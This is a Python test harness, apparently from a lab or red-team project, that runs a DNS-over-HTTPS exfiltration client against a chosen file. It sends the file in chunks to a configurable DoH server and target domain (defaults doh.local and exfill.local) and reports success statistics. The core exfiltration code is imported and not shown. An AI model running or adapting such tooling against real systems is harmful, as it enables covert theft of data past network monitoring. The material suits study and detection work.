#!/usr/bin/env python3
"""
Quick DoH Exfiltration Test

Simple test script for Docker integration verification.
Can test with a specific file or create a test file.
"""

import argparse
import logging
import os
import sys
import time
from pathlib import Path

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def test_integration(file_path=None):
    """Test DoH exfiltration integration with existing infrastructure"""
    logger.info("🚀 Starting DoH Exfiltration Integration Test")
    
    # Check environment
    doh_server = os.environ.get('DOH_SERVER', 'https://doh.local/dns-query')
    target_domain = os.environ.get('TARGET_DOMAIN', 'exfill.local')
    
    logger.info(f"DoH Server: {doh_server}")
    logger.info(f"Target Domain: {target_domain}")
    
    try:
        # Import our client
        sys.path.append('/app')
        from client import DoHExfiltrationClient, ExfiltrationConfig, EncodingType, TimingPattern, create_adaptive_config
        
        # Determine which file to use
        test_file = Path(file_path)
        if not test_file.exists():
            logger.error(f"❌ File not found: {file_path}")
            return False
        
        # Get file info
        file_size = test_file.stat().st_size
        logger.info(f"📁 Using specified file: {test_file}")
        logger.info(f"📊 File size: {file_size:,} bytes")
        
        # Create client configuration using adaptive sizing
        from client import create_adaptive_config
        
        logger.info(f"� Selecting adaptive configuration for {file_size:,} bytes file...")
        config = create_adaptive_config(file_size)
        
        # Override with environment variables
        config.doh_server = doh_server
        config.target_domain = target_domain
        
        logger.info(f"� Configuration selected:")
        logger.info(f"  - Strategy: {config.timing_pattern.value}")
        logger.info(f"  - Base chunk size: {config.chunk_size}")
        logger.info(f"  - Encoding: {config.encoding.value}")
        logger.info(f"  - Base delay: {config.base_delay}s")
        
        logger.info("Creating DoH exfiltration client...")
        client = DoHExfiltrationClient(config)
        
        logger.info("Starting exfiltration...")
        start_time = time.time()
        success = client.exfiltrate_file(str(test_file))
        end_time = time.time()
        
        if success:
            logger.info("✅ Integration test successful!")
            
            # Show statistics
            stats = client.stats
            duration = end_time - start_time
            
            logger.info("📊 Exfiltration Statistics:")
            logger.info(f"  - File: {test_file.name}")
            logger.info(f"  - Size: {file_size:,} bytes")
            logger.info(f"  - Total chunks: {stats['total_chunks']}")
            logger.info(f"  - Successful chunks: {stats['successful_chunks']}")
            logger.info(f"  - Failed chunks: {stats['failed_chunks']}")
            logger.info(f"  - Success rate: {(stats['successful_chunks']/stats['total_chunks']*100):.1f}%")
            logger.info(f"  - Total time: {duration:.2f} seconds")
            logger.info(f"  - Average speed: {(file_size/duration/1024):.1f} KB/s")
            
            # Check if any chunks failed
            if stats['failed_chunks'] > 0:
                logger.warning(f"⚠️ {stats['failed_chunks']} chunks failed - data may be incomplete")
            
        else:
            logger.error("❌ Integration test failed!")
            return False
            
    except Exception as e:
        logger.error(f"❌ Integration test error: {e}")
        import traceback
        traceback.print_exc()
        return False
    
    logger.info("🎉 Integration test completed successfully!")
    return True

def main():
    """Main function with argument parsing"""
    parser = argparse.ArgumentParser(description='DoH Exfiltration Test Script')
    parser.add_argument('file', nargs='?', help='File to exfiltrate (optional)')
    parser.add_argument('-s', '--server', default=None,
                       help='DoH server URL (default: from DOH_SERVER env var)')
    parser.add_argument('-d', '--domain', default=None,
                       help='Target domain (default: from TARGET_DOMAIN env var)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Enable verbose logging')
    
    args = parser.parse_args()
    
    # Set logging level
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Override environment variables if specified
    if args.server:
        os.environ['DOH_SERVER'] = args.server
    if args.domain:
        os.environ['TARGET_DOMAIN'] = args.domain
    
    # Run the test
    success = test_integration(args.file)
    
    if success:
        logger.info("🎯 Exfiltration completed successfully!")
        if args.file:
            logger.info(f"📁 File '{args.file}' has been exfiltrated via DoH")
    else:
        logger.error("❌ Exfiltration failed!")
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
